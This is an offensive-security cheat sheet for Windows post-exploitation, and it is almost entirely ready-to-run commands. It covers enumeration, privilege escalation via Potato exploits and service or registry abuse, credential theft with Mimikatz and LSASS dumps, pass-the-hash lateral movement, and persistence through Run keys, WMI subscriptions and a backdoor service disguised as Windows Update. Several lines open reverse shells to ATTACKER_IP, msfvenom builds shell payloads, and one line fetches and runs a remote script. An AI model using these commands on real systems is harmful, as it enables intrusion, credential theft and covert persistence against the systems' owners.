# PERSISTENCE Tools - Windows

> *"Windows grants power to those who know where to look."*

## Enumeration Tools

### WinPEAS
```powershell
# Download and run
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')

# Run executable
.\winPEASany.exe

# With options
.\winPEASany.exe quiet
.\winPEASany.exe fast
.\winPEASany.exe cmd

# Output to file
.\winPEASany.exe log
.\winPEASany.exe > winpeas_output.txt
```

### PowerUp (PowerSploit)
```powershell
# Import module
Import-Module .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Individual checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail -ServiceName "ServiceName"

# Abuse functions
Invoke-ServiceAbuse -ServiceName 'VulnService'
Write-ServiceBinary -ServiceName 'VulnService' -Command "net user backdoor Password123! /add"
```

### Seatbelt
```powershell
# Run all checks
.\Seatbelt.exe -group=all

# Specific categories
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=misc

# Specific checks
.\Seatbelt.exe TokenPrivileges
.\Seatbelt.exe UACSystemPolicies
.\Seatbelt.exe DotNet
```

### JAWS (Just Another Windows Script)
```powershell
# Run enumeration
.\jaws-enum.ps1

# Output to file
.\jaws-enum.ps1 > jaws-output.txt
```

### SharpUp
```powershell
# Run audit
.\SharpUp.exe audit

# Specific checks
.\SharpUp.exe ModifiableServices
.\SharpUp.exe ModifiableServiceBinaries
.\SharpUp.exe UnquotedServicePath
```

## Privilege Escalation

### Token Manipulation

#### Print Spooler (PrintNightmare)
```powershell
# CVE-2021-1675 / CVE-2021-34527
# Check if vulnerable
Get-Service -Name Spooler

# Exploit (various tools available)
```

#### Potato Attacks
```powershell
# SeImpersonate/SeAssignPrimaryToken required

# JuicyPotato (Windows 7/2008/2012)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe -e cmd ATTACKER_IP 4444" -t * -c {CLSID}

# RoguePotato (Windows 10/2016/2019)
.\RoguePotato.exe -r ATTACKER_IP -e "cmd /c c:\users\public\nc.exe ATTACKER_IP 4444 -e cmd" -l 9999

# SweetPotato
.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"

# PrintSpoofer (Windows 10/2016/2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Latest)
.\GodPotato.exe -cmd "cmd /c whoami"
```

#### Token Impersonation
```powershell
# Check privileges
whoami /priv

# Key privileges for exploitation
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeDebugPrivilege
SeTakeOwnershipPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeLoadDriverPrivilege
```

### Service Exploitation

#### Unquoted Service Paths
```powershell
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-ServiceUnquoted

# Exploit
# If path is: C:\Program Files\Vuln Service\service.exe
# Place malicious exe at: C:\Program.exe or C:\Program Files\Vuln.exe
```

#### Weak Service Permissions
```powershell
# Check service permissions
.\accesschk.exe /accepteula -uwcqv "user" *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Modify service
sc config VulnService binpath= "C:\path\to\malicious.exe"
sc stop VulnService
sc start VulnService

# PowerUp
Invoke-ServiceAbuse -ServiceName 'VulnService'
```

#### Weak Service Binary Permissions
```powershell
# Check binary permissions
.\accesschk.exe /accepteula -uwcqv "C:\path\to\service.exe"
icacls "C:\path\to\service.exe"

# Replace binary
copy C:\path\to\malicious.exe "C:\path\to\service.exe"
sc stop VulnService
sc start VulnService
```

### DLL Hijacking
```powershell
# Find missing DLLs
# Use Process Monitor (procmon) filtering for:
# Operation: CreateFile
# Result: NAME NOT FOUND
# Path ends with: .dll

# Common targets
# PATH directories with write access
# Application directories

# Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o malicious.dll
```

### Registry Attacks

#### AlwaysInstallElevated
```powershell
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, exploit
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

#### AutoRun Programs
```powershell
# Check AutoRun locations
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions on AutoRun executables
.\accesschk.exe /accepteula -wvu "C:\Program Files\AutoRunApp"
```

### Scheduled Tasks
```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check task permissions
.\accesschk.exe /accepteula -wvu "C:\path\to\task\binary"

# Create malicious task (if have permissions)
schtasks /create /sc onlogon /tn "Backdoor" /tr "C:\path\to\malicious.exe"
```

## Credential Harvesting

### Mimikatz
```powershell
# Dump credentials from memory
mimikatz # sekurlsa::logonpasswords

# Dump SAM database
mimikatz # lsadump::sam

# Dump LSA secrets
mimikatz # lsadump::secrets

# DCSync (Domain Admin)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Pass-the-Hash
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH

# Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH

# Export tickets
mimikatz # sekurlsa::tickets /export
```

### SharpDPAPI
```powershell
# Dump machine credentials
.\SharpDPAPI.exe machinetriage

# User credentials
.\SharpDPAPI.exe triage

# Credential blobs
.\SharpDPAPI.exe credentials /password:PASSWORD
```

### LaZagne
```powershell
# All credentials
.\laZagne.exe all

# Specific category
.\laZagne.exe browsers
.\laZagne.exe windows
```

### Credential Files
```powershell
# Stored credentials
cmdkey /list

# SAM and SYSTEM files (backup)
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive

# Extract with secretsdump
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\System32\sysprep\unattend.xml

# WinSCP
type %APPDATA%\WinSCP.ini

# PuTTY sessions
reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
```

### LSASS Dump
```powershell
# Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full

# Task Manager
# Right-click lsass.exe > Create dump file

# Extract offline with mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## Lateral Movement

### PsExec
```powershell
# Sysinternals PsExec
.\PsExec.exe \\target -u domain\user -p password cmd

# Impacket psexec
psexec.py domain/user:password@target
psexec.py -hashes :NTHASH domain/user@target
```

### WMI
```powershell
# Create process
wmic /node:target /user:domain\user /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# Impacket wmiexec
wmiexec.py domain/user:password@target
```

### WinRM
```powershell
# Enable WinRM
Enable-PSRemoting -Force

# Remote session
Enter-PSSession -ComputerName target -Credential domain\user

# Execute command
Invoke-Command -ComputerName target -Credential domain\user -ScriptBlock { whoami }

# Evil-WinRM
evil-winrm -i target -u user -p password
evil-winrm -i target -u user -H NTHASH
```

### Pass-the-Hash
```powershell
# Mimikatz
mimikatz # sekurlsa::pth /user:Administrator /domain:. /ntlm:HASH /run:cmd

# Impacket
psexec.py -hashes :NTHASH user@target
wmiexec.py -hashes :NTHASH user@target
smbexec.py -hashes :NTHASH user@target
```

### Pass-the-Ticket
```powershell
# Export tickets
mimikatz # sekurlsa::tickets /export

# Use ticket
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

## Persistence Mechanisms

### Registry Persistence
```powershell
# Run keys
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# RunOnce
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"

# Winlogon (runs at login)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\path\to\backdoor.exe"
```

### Scheduled Tasks
```powershell
# Create task
schtasks /create /sc onlogon /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe" /ru SYSTEM

# On boot
schtasks /create /sc onstart /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe" /ru SYSTEM

# Every 5 minutes
schtasks /create /sc minute /mo 5 /tn "SystemUpdate" /tr "C:\path\to\backdoor.exe"
```

### Services
```powershell
# Create service
sc create Backdoor binPath= "C:\path\to\backdoor.exe" start= auto
sc start Backdoor

# With description
sc create Backdoor binPath= "C:\path\to\backdoor.exe" start= auto DisplayName= "Windows Update Service"
sc description Backdoor "Provides automatic Windows updates"
```

### WMI Event Subscriptions
```powershell
# PowerShell WMI persistence
$FilterArgs = @{
    Name = 'BotFilter'
    EventNameSpace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
    Name = 'BotConsumer'
    CommandLineTemplate = "C:\path\to\backdoor.exe"
}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$BindingArgs = @{
    Filter = [Ref]$Filter
    Consumer = [Ref]$Consumer
}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $BindingArgs
```

### Startup Folder
```powershell
# User startup
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users startup
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### COM Hijacking
```powershell
# Find hijackable CLSIDs
# Look for InprocServer32 pointing to missing DLLs
# Common target: ScriptletURL

# Registry modification
reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\path\to\malicious.dll"
```

## Quick Reference

### Enumeration Checklist
```
[ ] System info (systeminfo, hostname)
[ ] Current user (whoami /all)
[ ] Users (net users, net localgroup)
[ ] Network (ipconfig, netstat)
[ ] Processes (tasklist)
[ ] Services (sc query)
[ ] Scheduled tasks (schtasks)
[ ] Installed software
[ ] Patch level (wmic qfe)
[ ] Firewall rules (netsh)
[ ] AV/EDR status
[ ] Credential stores (cmdkey)
[ ] Interesting files
```

### Common PrivEsc Paths
```
Token impersonation → Potato attacks
Unquoted service → Place malicious exe
Weak service perms → Modify binpath
Weak file perms → Replace binary
AlwaysInstallElevated → MSI payload
AutoLogon → Plaintext credentials
SAM/SYSTEM → Offline hash extraction
```
